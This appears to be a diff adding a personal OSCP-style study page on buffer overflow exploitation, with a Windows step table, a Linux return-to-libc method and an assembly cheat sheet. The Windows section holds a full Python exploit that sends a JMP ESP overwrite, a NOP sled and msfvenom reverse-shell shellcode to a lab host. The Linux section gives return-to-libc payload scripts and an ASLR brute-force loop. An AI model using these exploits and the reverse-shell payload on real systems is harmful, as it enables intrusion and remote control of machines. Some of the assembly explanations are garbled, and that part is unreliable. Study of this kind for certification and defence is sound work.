@@ -1,0 +1,268 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Buffer Overflows</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+    
+    <h1>Buffer Overflows</h1>
+    
+    <hr>
+    
+    <h2>OSCP/Windows BOF</h2>
+    
+    <table>
+        <tr>
+            <th>Step</th>
+            <th>Instruction</th>
+            <th>Explanation</th>
+        </tr>
+        <tr>
+            <td>1</td>
+            <td>Send a pattern</td>
+            <td>msf-pattern_create -l &lt;length&gt;</td>
+        </tr>
+        <tr>
+            <td>2</td>
+            <td>Find offset of where EIP lands when the program crashes</td>
+            <td>msf-pattern_offset -l &lt;length&gt; -q &lt;EIP crash&gt;</td>
+        </tr>
+        <tr>
+            <td>3</td>
+            <td>Test for bad characters</td>
+            <td>
+                <li>Place bad character test (all possible characters, hex encoded) after the EIP offset</li>
+                <li>Send buffer overflow and crash the program</li>
+                <li>Follow ESP in the dump and check if all characters are showing from the bad character test.</li>
+                <li>If characters are missing, then remove the first one that is not showing in the ESP dump from the bad character test, and then send the buffer overflow again.</li>
+                <li>Repeat this process until all characters that are sent in the bad character test successuflly show in the ESP dump.</li>
+            </td>
+        </tr>
+        <tr>
+            <td>4</td>
+            <td>Find jmp esp instruction and place it in EIP (after offset)</td>
+            <td>
+                <li>!mona jmp -r esp -cpb &lt;bad characters - example: &quot;\x00\x0A&quot;&gt;</li>
+                <ul>
+                    <li>Very common bad characters: &quot;\x00\x0A&quot;</li>
+                </ul>
+                <li>Set breakpoint on JMP instruction</li>
+                <ul>
+                    <li>To help troubleshoot add a breakboing on JMP instructions</li>
+                    <ul>
+                        <li>immunity debugger command: b &lt;JMP ESP Address&gt;</li>
+                    </ul>
+                </ul>
+            </td>
+        </tr>
+        <tr>
+            <td>5</td>
+            <td>Generate shell</td>
+            <td>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip address&gt; LPORT=&lt;port #&gt; -f python EXITFUNC=thread -v shell -b &quot;\x00\x0a\x0d\&lt;bad characters&gt;&quot;</td>
+        </tr>
+        <tr>
+            <td>6</td>
+            <td>Add NOPS in front of shell</td>
+            <td>Only 12 lines should be needed.  Add in increments of 4.</td>
+        </tr>
+    </table>
+    
+    <li>Bad character test:</li>
+    <pre>#!/usr/bin/python&#13;&#10;&#13;&#10;import socket&#13;&#10;import struct&#13;&#10;&#13;&#10;RHOST = &quot;192.168.179.10&quot;&#13;&#10;RPORT = 7001&#13;&#10;&#13;&#10;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)&#13;&#10;s.connect((RHOST,RPORT))&#13;&#10;&#13;&#10;totlen = 2560&#13;&#10;offset = 2288 &#13;&#10;badchars = (&quot;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;&#13;&#10;&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;&#13;&#10;&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;&#13;&#10;&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;&#13;&#10;&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;&#13;&#10;&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;&#13;&#10;&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;&#13;&#10;&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;)&#13;&#10;&#13;&#10;buf = &quot;&quot;&#13;&#10;buf += &quot;A&quot; * (offset - len(buf))&#13;&#10;buf += &quot;BBBB&quot;&#13;&#10;buf += badchars&#13;&#10;buf += &quot;C&quot; * (totlen - len(buf))&#13;&#10;buf += &quot;\n&quot;&#13;&#10;&#13;&#10;s.send(buf)&#13;&#10;print &quot;Sent: {0}&quot;.format(buf)&#13;&#10;&#13;&#10;data = s.recv(1024)&#13;&#10;print &quot;Received: {0}&quot;.format(data)</pre>
+    
+    <li>Example buffer overflow script:</li>
+    <pre>#!/usr/bin/python&#13;&#10;&#13;&#10;import socket&#13;&#10;import struct&#13;&#10;&#13;&#10;RHOST = &quot;192.168.179.10&quot;&#13;&#10;RPORT = 7001&#13;&#10;&#13;&#10;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)&#13;&#10;s.connect((RHOST,RPORT))&#13;&#10;&#13;&#10;totlen = 2560&#13;&#10;offset = 2288 &#13;&#10;jmp_esp = struct.pack(&quot;&lt;I&quot;,0x148010cf)&#13;&#10;nop_sled = &apos;\x90&apos;*12&#13;&#10;&#13;&#10;shell =  b&quot;&quot;&#13;&#10;shell += b&quot;\xbb\xa1\x52\xa1\x9c\xdd\xc2\xd9\x74\x24\xf4\x5f&quot;&#13;&#10;shell += b&quot;\x31\xc9\xb1\x52\x31\x5f\x12\x03\x5f\x12\x83\x66&quot;&#13;&#10;shell += b&quot;\x56\x43\x69\x94\xbf\x01\x92\x64\x40\x66\x1a\x81&quot;&#13;&#10;shell += b&quot;\x71\xa6\x78\xc2\x22\x16\x0a\x86\xce\xdd\x5e\x32&quot;&#13;&#10;shell += b&quot;\x44\x93\x76\x35\xed\x1e\xa1\x78\xee\x33\x91\x1b&quot;&#13;&#10;shell += b&quot;\x6c\x4e\xc6\xfb\x4d\x81\x1b\xfa\x8a\xfc\xd6\xae&quot;&#13;&#10;shell += b&quot;\x43\x8a\x45\x5e\xe7\xc6\x55\xd5\xbb\xc7\xdd\x0a&quot;&#13;&#10;shell += b&quot;\x0b\xe9\xcc\x9d\x07\xb0\xce\x1c\xcb\xc8\x46\x06&quot;&#13;&#10;shell += b&quot;\x08\xf4\x11\xbd\xfa\x82\xa3\x17\x33\x6a\x0f\x56&quot;&#13;&#10;shell += b&quot;\xfb\x99\x51\x9f\x3c\x42\x24\xe9\x3e\xff\x3f\x2e&quot;&#13;&#10;shell += b&quot;\x3c\xdb\xca\xb4\xe6\xa8\x6d\x10\x16\x7c\xeb\xd3&quot;&#13;&#10;shell += b&quot;\x14\xc9\x7f\xbb\x38\xcc\xac\xb0\x45\x45\x53\x16&quot;&#13;&#10;shell += b&quot;\xcc\x1d\x70\xb2\x94\xc6\x19\xe3\x70\xa8\x26\xf3&quot;&#13;&#10;shell += b&quot;\xda\x15\x83\x78\xf6\x42\xbe\x23\x9f\xa7\xf3\xdb&quot;&#13;&#10;shell += b&quot;\x5f\xa0\x84\xa8\x6d\x6f\x3f\x26\xde\xf8\x99\xb1&quot;&#13;&#10;shell += b&quot;\x21\xd3\x5e\x2d\xdc\xdc\x9e\x64\x1b\x88\xce\x1e&quot;&#13;&#10;shell += b&quot;\x8a\xb1\x84\xde\x33\x64\x0a\x8e\x9b\xd7\xeb\x7e&quot;&#13;&#10;shell += b&quot;\x5c\x88\x83\x94\x53\xf7\xb4\x97\xb9\x90\x5f\x62&quot;&#13;&#10;shell += b&quot;\x2a\x5f\x37\x1b\x19\x37\x4a\xe3\x4c\x94\xc3\x05&quot;&#13;&#10;shell += b&quot;\x04\x34\x82\x9e\xb1\xad\x8f\x54\x23\x31\x1a\x11&quot;&#13;&#10;shell += b&quot;\x63\xb9\xa9\xe6\x2a\x4a\xc7\xf4\xdb\xba\x92\xa6&quot;&#13;&#10;shell += b&quot;\x4a\xc4\x08\xce\x11\x57\xd7\x0e\x5f\x44\x40\x59&quot;&#13;&#10;shell += b&quot;\x08\xba\x99\x0f\xa4\xe5\x33\x2d\x35\x73\x7b\xf5&quot;&#13;&#10;shell += b&quot;\xe2\x40\x82\xf4\x67\xfc\xa0\xe6\xb1\xfd\xec\x52&quot;&#13;&#10;shell += b&quot;\x6e\xa8\xba\x0c\xc8\x02\x0d\xe6\x82\xf9\xc7\x6e&quot;&#13;&#10;shell += b&quot;\x52\x32\xd8\xe8\x5b\x1f\xae\x14\xed\xf6\xf7\x2b&quot;&#13;&#10;shell += b&quot;\xc2\x9e\xff\x54\x3e\x3f\xff\x8f\xfa\x5f\xe2\x05&quot;&#13;&#10;shell += b&quot;\xf7\xf7\xbb\xcc\xba\x95\x3b\x3b\xf8\xa3\xbf\xc9&quot;&#13;&#10;shell += b&quot;\x81\x57\xdf\xb8\x84\x1c\x67\x51\xf5\x0d\x02\x55&quot;&#13;&#10;shell += b&quot;\xaa\x2e\x07&quot;&#13;&#10;&#13;&#10;buf = &quot;&quot;&#13;&#10;buf += &quot;A&quot; * (offset - len(buf))&#13;&#10;buf += &quot;BBBB&quot;&#13;&#10;buf += jmp_esp&#13;&#10;buf += nop_sled&#13;&#10;buf += shell&#13;&#10;buf += &quot;C&quot; * (totlen - len(buf))&#13;&#10;buf += &quot;\n&quot;&#13;&#10;&#13;&#10;s.send(buf)&#13;&#10;print &quot;Sent: {0}&quot;.format(buf)&#13;&#10;&#13;&#10;data = s.recv(1024)&#13;&#10;print &quot;Received: {0}&quot;.format(data)</pre>
+    
+    
+    <hr>
+    
+    <h2>Linux BOF</h2>
+    
+    <li>C Program</li>
+    <ul>
+        <li>BOF vulnerable funtions: strcpy</li>
+        <li>Not BOF vulnerable functions: strncmp, strncpy</li>
+    </ul>
+    
+    <li>Compile with -ggdb</li>
+    <ul>
+        <li>Add debug information to assist with BOF creation</li>
+        <ul>
+            <li>list (press enter) will show source code of the binary inside gdb</li>
+        </ul>
+    </ul>
+    
+    <li>Check BOF protections</li>
+    
+    <table>
+        <tr>
+            <td>
+                Canary
+                <li>gdb-peda$ checksec</li>
+            </td>
+            <td></td>
+        </tr>
+        <tr>
+            <td>
+                Fortify
+                <li>gdb-peda$ checksec</li>
+            </td>
+            <td></td>
+        </tr>
+        <tr>
+            <td>
+                NX
+                <li>gdb-peda$ checksec</li>
+            </td>
+            <td>
+                <li>Enabled = Cannot run from the stack</li>
+                <li>Use return to libc method</li>
+                <ul>
+                    <li>Overwrite return address so the computer jumps to the desired function.  Typically the system function with the argument /bin/sh</li>
+                    <li>https://0xdf.gitlab.io/2019/03/23/htb-frolic.html</li>
+                </ul>
+            </td>
+        </tr>
+        <tr>
+            <td>
+                Position Independent Code (PIE)
+                <li>gdb-peda$ checksec</li>
+            </td>
+            <td></td>
+        </tr>
+        <tr>
+            <td>
+                Relocation Read-Only (RELRO)
+                <li>gdb-peda$ checksec</li>
+            </td>
+            <td></td>
+        </tr>
+        <tr>
+            <td>Address Space Layout Randomization (ASLR)</td>
+            <td>
+                <li>OS setting that randomizes where executables are loaded into memory</li>
+                <li>cat /proc/sys/kernel/randomize_va_space</li>
+                <ul>
+                    <li>1 = Disabled</li>
+                    <li>2 = Enabled</li>
+                    <ul>
+                        <li>If enabled, then run the BOF many times in order to get it to work</li>
+                        <ul>
+                            <li>for i in {1..5000}; do &lt;BOF&gt;; done</li>
+                        </ul>
+                    </ul>
+                </ul>
+            </td>
+        </tr>
+    </table>
+    
+    <h3>Return to libc BOF Methodology</h3>
+    
+    <table>
+        <tr>
+            <td>Get base libc address</td>
+            <td>
+                <li>ldd &lt;BOFable Program&gt;</li>
+                <ul>
+                    <li>Output: libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (<span class="purple">0xb7e19000</span>)</li>
+                </ul>
+            </td>
+        </tr>
+        <tr>
+            <td>Get address for System function</td>
+            <td>
+                <li><span class="red">readelf -s /lib/i386-linux-gnu/libc.so.6 | grep &quot; system@&quot;</span></li>
+                <ul>
+                    <li>gdb-peda$ p <span class="purple">0xb7e19000</span> + <span class="red">0x&lt;readelf hex address&gt;</span></li>
+                </ul>
+            </td>
+        </tr>
+        <tr>
+            <td>Get address for Exit function</td>
+            <td>
+                <li><span class="teal">readelf -s /lib/i386-linux-gnu/libc.so.6 | grep &quot; exit@&quot;</span></li>
+                <ul>
+                    <li>gdb-peda$ p <span class="purple">0xb7e19000</span> + <span class="teal">0x&lt;readelf hex address&gt;</span></li>
+                </ul>
+            </td>
+        </tr>
+        <tr>
+            <td>Get hex address for "/bin/sh"</td>
+            <td>
+                <li><span class="brown">strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh</span></li>
+                <ul>
+                    <li>gdb-peda$ p <span class="purple">0xb7e19000</span> + <span class="brown">0x&lt;Strings -a -t x hex address&gt;</span></li>
+                </ul>
+            </td>
+        </tr>
+        <tr>
+            <td>Assemble final BOF command/input</td>
+            <td>
+                <li>$(python -c &apos;print(&quot;a&quot;*&lt;offset&gt; + &quot;<span class="red">&lt;System&gt;</span>&quot; + &quot;<span class="teal">&lt;Exit&gt;</span>&quot; + &quot;<span class="brown">&lt;/bin/sh&gt;</span>&quot;)&apos;)</li>
+                <ul>
+                    <li>Find offset by sending a pattern of characters (msf-pattern_create) to trigger BOF and find where in the pattern the pointer instruction lands</li>
+                    <li>Addresses must be little-endian encoded</li>
+                    <ul>
+                        <li>0xb7e53da0 = \xa0\x3d\xe5\xb7</li>
+                    </ul>
+                </ul>
+                <li>Python3 script to assemble BOF command/input</li>
+                <pre>#! /usr/bin/env python3&#13;&#10;&#13;&#10;import struct&#13;&#10;import sys&#13;&#10;&#13;&#10;&#13;&#10;libc_base = <span class="purple">&lt;libc address&gt;</span>&#13;&#10;system = struct.pack(&quot;&lt;I&quot;, libc_base + <span class="red">0x&lt;system@@ address&gt;</span>)&#13;&#10;exit = struct.pack(&quot;&lt;I&quot;, libc_base + <span class="teal">0x&lt;exit@@ address&gt;</span>)&#13;&#10;binsh = struct.pack(&quot;&lt;I&quot;, libc_base + <span class="brown">0x&lt;/bin/sh address&gt;</span>)&#13;&#10;&#13;&#10;path = b&quot;A&quot; * &lt;msf-patten_offset&gt; + system + exit + binsh&#13;&#10;sys.stdout.buffer.write(path)&#13;&#10;</pre>
+            </td>
+        </tr>
+    </table>
+    
+    
+    <hr>
+    
+    <h2>Assembly Language</h2>
+    <table>
+        <tr>
+            <td>PUSH &lt;value&gt;</td>
+            <td>write a value to the top of the stack</td>
+        </tr>
+        <tr>
+            <td>POP &lt;register&gt;</td>
+            <td>Write whatever value is on the top of the stack to a specified register</td>
+        </tr>
+        <tr>
+            <td>CALL</td>
+            <td>
+                <li>Pushes the next instruction address to the stack so it can later be returned to</li>
+                <li>Modifies EIP so that execution jumps to the function being called</li>
+            </td>
+        </tr>
+        <tr>
+            <td>RET</td>
+            <td>
+                <li>Increment ESP by 4</li>
+                <li>Copies &lt;ESP Value&gt; to &lt;EIP address&gt;</li>
+            </td>
+        </tr>
+        <tr>
+            <td>PUSH</td>
+            <td>
+                <li>Decrement ESP by 4</li>
+                <li>PUSH &lt;value&gt; --&gt; ESP Address</li>
+            </td>
+        </tr>
+        <tr>
+            <td>MOV &lt;register 1&gt;, &lt;register 2 &gt;</td>
+            <td>Copy &lt;register 2 value &amp; address&gt; to &lt;register 1 value &amp; address&gt;</td>
+        </tr>
+        <tr>
+            <td>SUB &lt;register&gt;, &lt;#&gt;</td>
+            <td>Subtract &lt;#&gt; from &lt;register address&gt;</td>
+        </tr>
+        <tr>
+            <td>LEA &lt;register 1&gt;, &lt;register 2&gt;</td>
+            <td>Copy &lt;register 2 address&gt; to &lt;register 1 address&gt;</td>
+        </tr>
+    </table>
+    
+</body>
+</html>
